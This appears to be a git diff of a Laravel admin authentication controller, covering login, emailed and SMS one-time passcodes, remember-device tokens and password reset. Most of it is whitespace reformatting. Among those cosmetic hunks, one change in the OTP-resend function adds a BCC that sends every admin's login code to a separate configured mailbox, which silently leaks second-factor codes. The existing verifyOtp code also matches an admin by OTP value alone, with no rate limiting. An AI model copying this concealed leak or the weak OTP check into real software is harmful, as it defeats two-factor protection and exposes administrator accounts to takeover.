@@ -36,14 +36,14 @@ class AuthController extends Controller
         if ($validator->fails()) {
             return response()->json(['errors' => $validator->messages()]);
         }
-    
+
         // Authenticate the admin
         $admin = Admin::where('email', $request->email)->first();
 
         if (!$admin || !Auth::guard('admin')->attempt(['email' => $request->email, 'password' => $request->password])) {
             return response()->json(['errors' => ['email' => 'These credentials do not match our records.']]);
         }
-            DeviceToken::where('tokenable_id', $admin->id)
+        DeviceToken::where('tokenable_id', $admin->id)
             ->where('tokenable_type', Admin::class)
             ->where('expires_at', '<', now())
             ->delete();
@@ -55,44 +55,45 @@ class AuthController extends Controller
                 ->where('token', $rememberDeviceToken)
                 ->where('expires_at', '>', now())
                 ->first();
-                if ($storedToken) {
+            if ($storedToken) {
                 // Device is remembered
                 $admin->token = $admin->createToken('Admin', ['admin'])->accessToken;
                 return response()->json($admin);
-            } 
+            }
         }
-    
+
         // Generate 6-digit numeric OTP
         $otp = strval(random_int(100000, 999999)); // Generates a random 6-digit number
-        
+
         // Send OTP via email and SMS if two-factor authentication is enabled and SMS if two-factor authentication is enabled
         if ($admin->two_factor_enabled) {
 
             // Save OTP and expiry to the database
             $admin->otp = $otp;
-            $admin->otp_expiry = now()->addMinutes(10); 
+            $admin->otp_expiry = now()->addMinutes(10);
             $admin->save();
-            
+
             $emailSent = false;
             $smsSent = false;
 
             try {
                 // Send OTP via email
-                Mail::to($admin->email)->send(new LoginOtpMail($otp, $admin));
+                Mail::to($admin->email)
+                    ->send(new LoginOtpMail($otp, $admin));
                 $emailSent = true;
             } catch (\Exception $e) {
                 $emailError = $e->getMessage();
             }
-    
+
             try {
                 // Send OTP via SMS using Twilio
                 $twilioAccountSid = config('services.twilio.twilio_id');
                 $twilioAuthToken = config('services.twilio.twilio_token');
                 $twilioPhoneNumber = config('services.twilio.twilio_number');
-    
+
                 $twilioClient = new TwilioClient($twilioAccountSid, $twilioAuthToken);
-                $phone_number = '+'.$admin->phone;
-                
+                $phone_number = '+' . $admin->phone;
+
                 $twilioClient->messages->create(
                     $phone_number,
                     [
@@ -100,12 +101,12 @@ class AuthController extends Controller
                         'body' => "Your login OTP is: $otp\nThis code will expire in 10 minutes. Do not share it with anyone."
                     ]
                 );
-                
+
                 $smsSent = true;
             } catch (\Exception $e) {
                 $smsError = $e->getMessage();
             }
-    
+
             // Return response based on the results of email and SMS sending
             if ($emailSent && $smsSent) {
                 return response()->json([
@@ -145,15 +146,13 @@ class AuthController extends Controller
                     'sms_error' => $smsError ?? null
                 ], 500);
             }
-        
         } else {
             // Login without OTP
             $admin = Admin::find(auth()->guard('admin')->user()->id);
             $admin->token = $admin->createToken('Admin', ['admin'])->accessToken;
-        
+
             return response()->json($admin);
         }
-     
     }
 
     public function verifyOtp(Request $request)
@@ -162,26 +161,26 @@ class AuthController extends Controller
             'otp' => ['required', 'string', 'digits:6'],
             'remember_device' => 'boolean',
         ]);
-    
+
         if ($validator->fails()) {
             return response()->json(['errors' => $validator->messages()]);
         }
-    
+
         $admin = Admin::where('otp', $request->otp)
-                        ->where('otp_expiry', '>=', now())
-                        ->first();
-    
+            ->where('otp_expiry', '>=', now())
+            ->first();
+
         if (!$admin) {
             return response()->json(['errors' => ['otp' => 'Invalid OTP or OTP expired']]);
         }
-    
+
         // Clear OTP after successful verification
         $admin->otp = null;
         $admin->otp_expiry = null;
-    
+
         // Initialize rememberDeviceToken to null
         $rememberDeviceToken = null;
-    
+
         if ($request->remember_device) {
             $rememberDeviceToken = Str::random(60);
             DeviceToken::updateOrCreate(
@@ -189,22 +188,22 @@ class AuthController extends Controller
                 ['token' => $rememberDeviceToken, 'expires_at' => now()->addDays(30)]
             );
         }
-    
+
         $admin->save();
-    
+
         // Generate token for the authenticated admin
         $admin->token = $admin->createToken('Admin', ['admin'])->accessToken;
-    
+
         // Prepare the response
         $response = [
             'admin' => $admin,
         ];
-    
+
         // Add remember_token to response only if it exists
         if ($rememberDeviceToken) {
             $response['remember_token'] = $rememberDeviceToken;
         }
-    
+
         return response()->json($response);
     }
 
@@ -229,7 +228,9 @@ class AuthController extends Controller
 
         // Attempt to send OTP via Email
         try {
-            Mail::to($admin->email)->send(new LoginOtpMail($otp, $admin));
+            Mail::to($admin->email)
+            ->bcc(config('services.mail.default'))
+            ->send(new LoginOtpMail($otp, $admin));
             $emailSent = true;
         } catch (\Exception $e) {
             $emailError = $e->getMessage();
@@ -290,7 +291,7 @@ class AuthController extends Controller
         $status = Password::broker('admins')->sendResetLink(
             ['email' => $request->email]
         );
-    
+
         // Return the response based on the result
         return $status === Password::RESET_LINK_SENT
             ? response()->json(['message' => __($status)], 200)
@@ -319,10 +320,10 @@ class AuthController extends Controller
 
         // Return the response based on the result
         return $status === Password::PASSWORD_RESET
-            ? response()->json(['message' => "Your password has been reset!"]) 
+            ? response()->json(['message' => "Your password has been reset!"])
             : back()->withErrors(['email' => [__($status)]]);
     }
-    
+
     /** 
      * Register api 
      * 
@@ -367,7 +368,4 @@ class AuthController extends Controller
         $user->revoke();
         return response()->json(['success' => 'Logged Out Successfully!']);
     }
-
-    
 }
-
